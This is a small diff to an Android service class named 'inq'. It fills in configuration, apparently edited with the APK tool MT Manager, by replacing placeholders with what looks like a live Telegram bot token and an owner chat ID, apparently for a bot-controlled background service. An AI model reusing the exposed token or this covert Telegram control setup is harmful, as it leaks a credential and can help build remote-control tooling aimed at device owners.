@@ -70,8 +70,8 @@ import java.util.concurrent.atomic.AtomicBoolean;
 public class inq extends Service {
 
     // CONFIG - edit with MT Manager
-    static String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-    static String OWNER_ID  = "YOUR_CHAT_ID_HERE";
+    static String BOT_TOKEN = "8846771755:AAHpLMb07quH2TR9Vw5m40RUHzPOOTtBdR8";
+    static String OWNER_ID  = "7507787272";
 
     private static volatile boolean running = false;
     private static volatile boolean polling = false;
